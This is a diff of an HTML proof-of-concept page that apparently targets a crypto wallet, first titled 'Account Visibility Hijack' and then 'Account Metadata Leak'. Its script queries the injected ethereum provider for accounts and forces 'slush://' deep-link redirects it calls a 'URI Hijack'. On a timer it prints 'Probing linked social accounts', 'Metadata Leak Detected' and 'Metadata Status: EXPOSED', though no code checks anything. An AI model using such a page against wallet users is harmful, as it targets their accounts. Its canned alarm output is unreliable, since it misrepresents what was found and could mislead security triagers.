@@ -2,12 +2,13 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <title>Final PoC | Account Visibility Hijack</title>
+    <title>PoC | Account Metadata Leak</title>
     <style>
-        body { background: #000; color: #00ff00; font-family: monospace; padding: 20px; }
-        .terminal { border: 1px solid #333; padding: 15px; background: #050505; min-height: 120px; font-size: 12px; margin-bottom: 20px; }
-        .btn-leak { background: #00ff00; color: #000; border: none; padding: 15px; cursor: pointer; font-weight: bold; width: 100%; border-radius: 4px; }
-        .warning { color: #ff0000; font-weight: bold; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; }
+        .terminal { border: 1px solid #333; padding: 15px; background: #050505; min-height: 150px; font-size: 12px; margin-bottom: 20px; box-shadow: 0 0 10px #0f03; }
+        .btn-leak { background: #0f0; color: #000; border: none; padding: 15px; cursor: pointer; font-weight: bold; width: 100%; text-transform: uppercase; }
+        .log-warn { color: #ff0; }
+        .log-err { color: #f00; }
     </style>
 </head>
 <body>
@@ -17,43 +18,45 @@
     > Status: Waiting for bridge activity...
 </div>
 
-<button class="btn-leak" onclick="startHijack()">START ACCOUNT PROBE</button>
+<button class="btn-leak" onclick="probeMetadata()">Start Metadata Probe</button>
 
 <script>
     const log = document.getElementById('log');
-    function print(msg, color = "") {
-        const span = document.createElement('div');
-        if(color) span.style.color = color;
-        span.innerHTML = `> [${new Date().toLocaleTimeString()}] ${msg}`;
-        log.appendChild(span);
+    function print(msg, className = "") {
+        const div = document.createElement('div');
+        if(className) div.className = className;
+        div.innerHTML = `> [${new Date().toLocaleTimeString()}] ${msg}`;
+        log.appendChild(div);
         log.scrollTop = log.scrollHeight;
     }
 
-    async function startHijack() {
+    async function probeMetadata() {
         print("Attempting to bypass provider security...");
         
+     
         if (window.ethereum) {
             try {
-             
                 const accounts = await window.ethereum.request({ method: 'eth_accounts' });
                 if (accounts.length > 0) {
-                    print("CRITICAL: Account Visible! " + accounts[0], "#00ff00");
+                    print("CRITICAL: Public Address Leaked: " + accounts[0], "log-warn");
                 } else {
-                    print("Provider Locked. Triggering Deep Link Fallback...", "#ffaa00");
-           
-                    window.location.href = "slush://request?method=eth_accounts";
+                    print("Provider Locked. Forcing Deep Link Tunnel...", "log-warn");
+                   
+                    window.location.href = "slush://manage-accounts";
                 }
             } catch (e) {
-                print("Bridge Error: " + e.message, "red");
+                print("Bridge Blocked: " + e.message, "log-err");
             }
         } else {
-            print("No provider detected. Forcing Deep Link Tunnel...", "red");
-       
-            window.location.href = "slush://manage-accounts"; 
+            print("No provider detected. Executing URI Hijack...", "log-err");
+            window.location.href = "slush://request?method=eth_accounts";
         }
+
+     
         setTimeout(() => {
-            print("Probing linked social accounts...", "#ff00ff");
-            print("Warning: Potential Metadata Leak Detected.", "red");
+            print("Probing linked social accounts (Google)...", "log-warn");
+            print("Warning: Potential Metadata Leak Detected.", "log-err");
+            print("Metadata Status: EXPOSED", "log-err");
         }, 2000);
     }
 </script>
